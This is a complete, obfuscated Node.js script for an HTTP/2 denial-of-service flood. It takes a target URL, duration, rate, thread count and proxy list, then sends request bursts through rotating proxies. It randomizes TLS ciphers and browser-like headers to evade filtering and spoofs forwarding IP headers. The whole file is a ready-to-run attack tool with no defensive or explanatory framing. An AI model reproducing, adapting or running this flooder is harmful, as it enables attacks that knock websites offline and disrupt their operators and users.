const net = require('net');
const http2 = require('http2'),
  tls = require('tls');
const cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  fs = require('fs');
process['setMaxListeners'](0), require('events')['EventEmitter']['defaultMaxListeners'] = 0, process['on']('uncaughtException', function (_0x24c638) {});
process['argv']['length'] < 7 && (console['log']('Usage: target time rate thread proxyfile'), process['exit']());
const headers = {};
function readLines(_0x42600b) {
  return fs['readFileSync'](_0x42600b, 'utf-8')['toString']()['split'](/\r?\n/);
}
function randomIntn(_0x4016ac, _0x4e28b1) {
  return Math['floor'](Math['random']() * (_0x4e28b1 - _0x4016ac) + _0x4016ac);
}
function randomElement(_0xcdd067) {
  return _0xcdd067[randomIntn(0, _0xcdd067['length'])];
}
function randstr(_0x5793e8) {
  const _0x3f3a99 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let _0x5c8f2d = '';
  const _0x2e6b38 = _0x3f3a99['length'];
  for (let _0x108151 = 0; _0x108151 < _0x5793e8; _0x108151++) {
    _0x5c8f2d += _0x3f3a99['charAt'](Math['floor'](Math['random']() * _0x2e6b38));
  }
  return _0x5c8f2d;
}
const ip_spoof = () => {
    const _0x400f00 = () => {
      return Math['floor'](Math['random']() * 255);
    };
    return _0x400f00() + '.' + _0x400f00() + '.' + _0x400f00() + '.' + _0x400f00();
  },
  spoofed = ip_spoof(),
  args = {
    'target': process['argv'][2],
    'time': parseInt(process['argv'][3]),
    'Rate': parseInt(process['argv'][4]),
    'threads': parseInt(process['argv'][5]),
    'proxyFile': process['argv'][6]
  },
  sig = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'],
  sigalgs1 = sig['join'](':'),
  cplist = ['ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384'],
  accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'],
  lang_header = ['en-US,en;q=0.9'],
  encoding_header = ['gzip, deflate, br'],
  control_header = ['no-cache', 'max-age=0'],
  refers = ['https://www.google.com/', 'https://www.facebook.com/', 'https://www.twitter.com/', 'https://www.youtube.com/', 'https://www.linkedin.com/'],
  defaultCiphers = crypto['constants']['defaultCoreCipherList']['split'](':'),
  ciphers1 = 'GREASE:' + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers['slice'](3)]['join'](':'),
  uap = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36'];
var cipper = cplist[Math['floor'](Math['floor'](Math['random']() * cplist['length']))],
  siga = sig[Math['floor'](Math['floor'](Math['random']() * sig['length']))];
var uap1 = uap[Math['floor'](Math['floor'](Math['random']() * uap['length']))],
  Ref = refers[Math['floor'](Math['floor'](Math['random']() * refers['length']))];
var accept = accept_header[Math['floor'](Math['floor'](Math['random']() * accept_header['length']))],
  lang = lang_header[Math['floor'](Math['floor'](Math['random']() * lang_header['length']))],
  encoding = encoding_header[Math['floor'](Math['floor'](Math['random']() * encoding_header['length']))],
  control = control_header[Math['floor'](Math['floor'](Math['random']() * control_header['length']))],
  proxies = readLines(args['proxyFile']);
const parsedTarget = url['parse'](args['target']);
if (cluster['isMaster']) for (let counter = 1; counter <= args['threads']; counter++) {
  cluster['fork']();
} else setInterval(runFlooder);
class NetSocket {
  constructor() {}
  ['HTTP'](_0x16cf6b, _0x1447fd) {
    const _0x31d751 = _0x16cf6b['address']['split'](':');
    const _0x577bbd = _0x31d751[0],
      _0x3f3ad0 = 'CONNECT ' + _0x16cf6b['address'] + ':443 HTTP/1.1\r\nHost: ' + _0x16cf6b['address'] + ':443\r\nConnection: Keep-Alive\r\n\r\n';
    const _0x19b998 = new Buffer['from'](_0x3f3ad0);
    const _0x584246 = {};
    _0x584246['host'] = _0x16cf6b['host'], _0x584246['port'] = _0x16cf6b['port'];
    const _0x15cbfc = net['connect'](_0x584246);
    _0x15cbfc['setTimeout'](_0x16cf6b['timeout'] * 100000), _0x15cbfc['setKeepAlive'](true, 100000), _0x15cbfc['on']('connect', () => {
      _0x15cbfc['write'](_0x19b998);
    }), _0x15cbfc['on']('data', _0x1b5bec => {
      const _0x5da751 = _0x1b5bec['toString']('utf-8'),
        _0x1e16aa = _0x5da751['includes']('HTTP/1.1 200');
      if (_0x1e16aa === false) return _0x15cbfc['destroy'](), _0x1447fd(undefined, 'error: invalid response from proxy server');
      return _0x1447fd(_0x15cbfc, undefined);
    }), _0x15cbfc['on']('timeout', () => {
      return _0x15cbfc['destroy'](), _0x1447fd(undefined, 'error: timeout exceeded');
    }), _0x15cbfc['on']('error', _0x4c6aa7 => {
      return _0x15cbfc['destroy'](), _0x1447fd(undefined, 'error: ' + _0x4c6aa7);
    });
  }
}
const Socker = new NetSocket();
headers[':method'] = 'GET', 
headers[':authority'] = parsedTarget['host'], 
headers[':path'] = parsedTarget['path'] + '?' + randstr(5) + '=' + randstr(25), 
headers[':scheme'] = 'https', 
headers['x-forwarded-proto'] = 'https', 
headers['accept-language'] = lang, 
headers['accept-encoding'] = encoding, 
headers['cache-control'] = control, 
headers['sec-ch-ua'] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"', 
headers['sec-ch-ua-mobile'] = '?0', 
headers['sec-ch-ua-platform'] = 'Windows', 
headers['upgrade-insecure-requests'] = '1', 
headers['accept'] = accept, 
headers['user-agent'] = randstr(15), 
headers['sec-fetch-dest'] = 'document', 
headers['sec-fetch-mode'] = 'navigate', 
headers['sec-fetch-site'] = 'none', 
headers['TE'] = 'trailers', 
headers['sec-fetch-user'] = '?1', 
headers['x-requested-with'] = 'XMLHttpRequest';
function runFlooder() {
  const _0x35d764 = randomElement(proxies);
  const _0x4b6452 = _0x35d764['split'](':');
  headers['referer'] = 'https://' + parsedTarget['host'] + '/?' + randstr(15);
  headers['X-Forwarded-For'] = spoofed;
  headers['X-Forwarded-Host'] = spoofed, headers['Real-IP'] = spoofed, headers['origin'] = 'https://' + parsedTarget['host'];
  const _0x3cdcf7 = {
    'host': _0x4b6452[0],
    'port': ~~_0x4b6452[1],
    'address': parsedTarget['host'] + ':443',
    'timeout': 0x64
  };
  Socker['HTTP'](_0x3cdcf7, (_0x1c0bed, _0x5d3684) => {
    if (_0x5d3684) return;
    _0x1c0bed['setKeepAlive'](true, 600000);
    const _0x2cd8ff = {};
    _0x2cd8ff['host'] = parsedTarget['host'], _0x2cd8ff['port'] = 0x1bb, _0x2cd8ff['secure'] = true, _0x2cd8ff['ALPNProtocols'] = ['h2'], _0x2cd8ff['sigals'] = siga, _0x2cd8ff['socket'] = _0x1c0bed, _0x2cd8ff['ciphers'] = cipper, _0x2cd8ff['ecdhCurve'] = 'prime256v1:X25519', _0x2cd8ff['host'] = parsedTarget['host'], _0x2cd8ff['compression'] = true, _0x2cd8ff['rejectUnauthorized'] = false, _0x2cd8ff['servername'] = parsedTarget['host'], _0x2cd8ff['secureProtocol'] = 'TLS_method';
    const _0x4751f4 = _0x2cd8ff,
      _0x8b3eea = tls['connect'](443, parsedTarget['host'], _0x4751f4);
    _0x8b3eea['setKeepAlive'](true, 60000);
    const _0x4c6c59 = {};
    _0x4c6c59['headerTableSize'] = 0x10000, _0x4c6c59['maxConcurrentStreams'] = 0x2710, _0x4c6c59['initialWindowSize'] = 0xffff, _0x4c6c59['maxHeaderListSize'] = 0x10000, _0x4c6c59['enablePush'] = false;
    const _0x10501a = {};
    _0x10501a['protocol'] = 'https:', _0x10501a['settings'] = _0x4c6c59, _0x10501a['maxSessionMemory'] = 0xfa00, _0x10501a['maxDeflateDynamicTableSize'] = 0xffffffff, _0x10501a['createConnection'] = () => _0x8b3eea, _0x10501a['socket'] = _0x1c0bed;
    const _0x7a98ce = http2['connect'](parsedTarget['href'], _0x10501a),
      _0x13287a = {};
    _0x13287a['headerTableSize'] = 0x10000, _0x13287a['maxConcurrentStreams'] = 0x2710, _0x13287a['initialWindowSize'] = 0x600000, _0x13287a['maxHeaderListSize'] = 0x10000, _0x13287a['enablePush'] = false, _0x7a98ce['settings'](_0x13287a), _0x7a98ce['on']('connect', () => {
      const _0x3431b8 = setInterval(() => {
        for (let _0x5a7f3f = 0; _0x5a7f3f < args['Rate']; _0x5a7f3f++) {
          const _0x4b400d = _0x7a98ce['request'](headers)['on']('response', _0x10f977 => {
            _0x4b400d['close'](), _0x4b400d['destroy']();
            return;
          });
          _0x4b400d['end']();
        }
      }, 500);
    }), _0x7a98ce['on']('close', () => {
      _0x7a98ce['destroy'](), _0x1c0bed['destroy']();
      return;
    });
  }), function (_0x81d145, _0x157574, _0x4d52d9) {};
}
const KillScript = () => process['exit'](1);
setTimeout(KillScript, args['time'] * 1000);